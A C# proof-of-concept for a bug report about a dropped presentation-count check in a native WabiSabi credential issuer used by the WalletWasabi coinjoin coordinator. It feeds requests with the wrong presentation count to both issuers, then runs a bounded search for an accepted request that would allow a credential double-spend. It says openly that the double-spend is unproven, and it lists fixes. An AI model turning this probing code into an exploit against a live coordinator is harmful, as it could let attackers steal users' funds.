/*
 * PoC: dropped presentation-count guard in WabiSabi.Native.CredentialIssuer (v1.3.0),
 * wired into the WalletWasabi coordinator by commit f8e1d4d (Round.cs:
 * `using CredentialIssuer = WabiSabi.Native.CredentialIssuer`).
 *
 * The audited managed issuer (WabiSabi.Crypto.CredentialIssuer, lines 127-134) rejects any
 * non-null request that does not present exactly ProtocolConstants.CredentialNumber (2)
 * credentials. The native issuer that replaced it enforces no such check, and the C library
 * reads a FIXED 2 presentations from fixed byte offsets (c/src/ffi.c:548, issuer.c:141).
 *
 * This is a defensive artifact for an upstream bug report. It proves the regression and
 * then states, honestly, exactly how far it does and does not reach toward an exploit.
 */

using System;
using System.Linq;
using System.Reflection;
using System.Threading;
using WabiSabi;
using WabiSabi.Crypto;
using WabiSabi.Crypto.Groups;
using WabiSabi.Crypto.Randomness;
using WabiSabi.Crypto.ZeroKnowledge;
using WabiSabi.CredentialRequesting;

using CsIssuer     = WabiSabi.Crypto.CredentialIssuer;
using NativeIssuer = WabiSabi.Native.CredentialIssuer;

class Poc
{
    const long MaxAmount = 1_000_000L;
    static WasabiRandom Rng => SecureRandom.Instance;

    static (bool ok, string err) Run(Func<CredentialsResponse> f)
    {
        try { f(); return (true, ""); }
        catch (Exception ex) { return (false, $"{ex.GetType().Name.Replace("WabiSabiCryptoException","reject")}: {ex.Message.Split('\n')[0]}"); }
    }

    static int RecordedSerials(NativeIssuer ni)
    {
        var fld = typeof(NativeIssuer).GetField("_serialNumbers", BindingFlags.NonPublic | BindingFlags.Instance);
        return ((System.Collections.IEnumerable)fld.GetValue(ni)).Cast<object>().Count();
    }

    static void Main()
    {
        Console.WriteLine("WabiSabi native issuer -- dropped presentation-count guard\n");

        var sk = new CredentialIssuerSecretKey(Rng);
        var iparams = sk.ComputeCredentialIssuerParameters();
        var client = new WabiSabiClient(iparams, Rng, MaxAmount);

        var zd = client.CreateRequestForZeroAmount();
        var boot = new CsIssuer(sk, Rng, MaxAmount);
        var zeroCreds = client.HandleResponse(boot.HandleRequest(zd.CredentialsRequest), zd.CredentialsResponseValidation).ToArray();
        var realData = client.CreateRequest(new long[] { 400_000, 300_000 }, zeroCreds, CancellationToken.None);
        var real = (RealCredentialsRequest)realData.CredentialsRequest;
        var pres = real.Presented.ToArray();

        // ===== CLAIM 1: the count guard was dropped (PROVEN) ===================
        Console.WriteLine("CLAIM 1 [PROVEN]: managed enforces 'exactly 2 presentations'; native does not.\n");
        foreach (var n in new[] { 0, 1, 2, 3 })
        {
            var p = n <= pres.Length ? pres.Take(n).ToArray()
                                     : pres.Concat(Enumerable.Repeat(pres[0], n - pres.Length)).ToArray();
            var req = new RealCredentialsRequest(real.Delta, p, real.Requested, real.Proofs);
            var (cOk, cErr) = Run(() => new CsIssuer(sk, Rng, MaxAmount).HandleRequest(req));
            var (nOk, nErr) = Run(() => new NativeIssuer(sk, Rng, MaxAmount).HandleRequest(req));
            Console.WriteLine($"  Presented.Count={n,-2} managed: {(cOk?"ACCEPT":"reject"),-6} {cErr}");
            Console.WriteLine($"  {"",21}native : {(nOk?"ACCEPT":"reject"),-6} {nErr}");
        }
        Console.WriteLine("  Observe: for count in {0,1,3} managed rejects with the COUNT guard.");
        Console.WriteLine("  Native never mentions a count -- it reaches the C parser/verifier instead,");
        Console.WriteLine("  i.e. it has no equivalent of managed CredentialIssuer.cs:127-134.");

        // ===== CLAIM 2: C reads a FIXED 2 presentations (CODE, corroborated) ===
        Console.WriteLine("\nCLAIM 2 [CODE-PROVEN]: the C library reads exactly 2 presentations from fixed");
        Console.WriteLine("  offsets regardless of how many were declared, and builds 2 show-statements:");
        Console.WriteLine("    c/src/ffi.c:548   for (i=0; i<WABISABI_CREDENTIAL_COUNT; i++) read_presentation(...)");
        Console.WriteLine("    c/src/issuer.c:141 for (i=0; i<WABISABI_CREDENTIAL_COUNT; i++) show_credential_statement");
        Console.WriteLine("  Corroboration: with Presented.Count=1 the native rejection is a PARSE error (code 3)");
        Console.WriteLine("  on presented[1] -- proving it tried to read a 2nd presentation from bytes the");
        Console.WriteLine("  declared request did not intend as one (managed rejected the same input on count).");

        // ===== CLAIM 3: the wrapper records serials only for declared presentations =
        Console.WriteLine("\nCLAIM 3 [CODE-PROVEN mechanism]: double-spend prevention is the wrapper's job");
        Console.WriteLine("  (Native/CredentialIssuer.cs:89-101) and it records serials for the DECLARED");
        Console.WriteLine("  presentations only; the C library tracks none. Serial S = Randomness*Gs is fixed");
        Console.WriteLine("  per credential (Credential.cs:53), so an unburned serial stays re-presentable.");
        var niOk = new NativeIssuer(sk, Rng, MaxAmount);
        Run(() => niOk.HandleRequest(real));                       // a valid 2-presentation request
        Console.WriteLine($"    valid Presented.Count=2 request  -> serials recorded = {RecordedSerials(niOk)} (expected 2)");
        Console.WriteLine("    a Presented.Count=1 request would record 1 while C verifies 2 -- BUT only if C");
        Console.WriteLine("    accepts; on rejection the wrapper rolls the serial back (line 126). So the");
        Console.WriteLine("    desync only yields an unburned serial when native ACCEPTS such a request.");

        // ===== IMPACT PROBE: is a native-accepted Presented.Count!=2 request reachable? ==
        Console.WriteLine("\nIMPACT [NOT DEMONSTRATED]: a working double-spend requires native to ACCEPT a");
        Console.WriteLine("  Presented.Count<2 request. That needs presented[1] -- read from the overrun bytes --");
        Console.WriteLine("  to be a genuinely issued credential with a verifying show-proof, while the SAME bytes");
        Console.WriteLine("  simultaneously serialize the request's Requested commitments and Proofs, and all");
        Console.WriteLine("  proofs verify under one batched Fiat-Shamir challenge. Bounded search for acceptance:");
        int tries = 0, accepted = 0;
        for (; tries < 3000; tries++)
        {
            var p2 = zeroCreds[tries % zeroCreds.Length].Present(Rng.GetScalar());
            var reqArr = real.Requested.ToArray();
            // vary the overrun region across attempts
            reqArr[0] = new IssuanceRequest(reqArr[0].Ma + (Rng.GetScalar() * Generators.Gg), reqArr[0].BitCommitments);
            var attempt = new RealCredentialsRequest(real.Delta, new[] { pres[0] }, reqArr, real.Proofs);
            var (ok, _) = Run(() => new NativeIssuer(sk, Rng, MaxAmount).HandleRequest(attempt));
            if (ok) { accepted++; break; }
        }
        Console.WriteLine($"    attempts={tries + (accepted>0?1:0)}, native-accepted={accepted}");
        Console.WriteLine(accepted > 0
            ? "    => DOUBLE-SPEND REACHABLE: native accepted a Presented.Count=1 request."
            : "    => acceptance NOT achieved. The regression is proven; the end-to-end double-spend is");
        if (accepted == 0)
            Console.WriteLine("       NOT demonstrated (the alignment+proof fixed-point is the open obstacle).");

        Console.WriteLine("\nSUMMARY: CONFIRMED regression (dropped count guard, native reaches C with the wrong");
        Console.WriteLine("  presentation count). Exploit (credential double-spend) UNPROVEN here. Fix: restore the");
        Console.WriteLine("  count guards in the native wrapper; reject off!=req_len in the FFI; validate");
        Console.WriteLine("  Presented.Count in Arena for defense-in-depth.");
    }
}
